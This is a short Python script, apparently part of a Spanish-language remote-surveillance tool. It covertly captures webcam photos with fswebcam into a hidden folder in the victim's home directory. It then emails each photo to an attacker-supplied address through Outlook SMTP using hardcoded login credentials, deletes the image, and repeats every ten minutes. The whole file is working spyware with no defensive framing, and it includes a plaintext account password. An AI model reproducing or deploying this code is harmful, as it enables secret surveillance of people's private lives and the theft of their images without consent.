#!/bin/python3.7
with open("/usr/bin/config.txt", "r") as cfile:
	config = cfile.read().split('|')
	if config[0] == "empty":
		receiver_email = input("Email Atacante >> ")
	else:
		receiver_email = config[0]
	machine_name = config[1]
	usuario = config[2]
	usuario = usuario.replace('\n','')
cfile.close()

def send_email():

	import smtplib
	from email.mime.text import MIMEText
	from email.mime.multipart import MIMEMultipart
	from email.mime.image import MIMEImage
	
	sender_email = "sendregistros@outlook.com"
	message = MIMEMultipart()

	with open('/home/'+usuario+'/.v1kox/0v53rber/web-cam-shot.jpg', 'rb') as image_file:
		message.attach(MIMEImage(image_file.read()))

	message['From'] = sender_email
	message['To'] = receiver_email
	message['Subject'] = 'Captura de webcam | '+machine_name
	msg_full = message.as_string()

	server = smtplib.SMTP('smtp-mail.outlook.com',587)
	server.starttls()
	server.login(sender_email, "@3nv14d0rd3r3g1str0s_1020@")
	server.sendmail(sender_email,receiver_email,msg_full)
	server.quit()

def make_snap():
    import os
    import time as tm
    os.system('fswebcam -r 640x480 --jpeg 85 -D 1 /home/'+usuario+'/.v1kox/0v53rber/web-cam-shot.jpg')
    send_email()
    os.system('rm /home/'+usuario+'/.v1kox/0v53rber/web-cam-shot.jpg')
    tm.sleep(600)
    make_snap()
make_snap()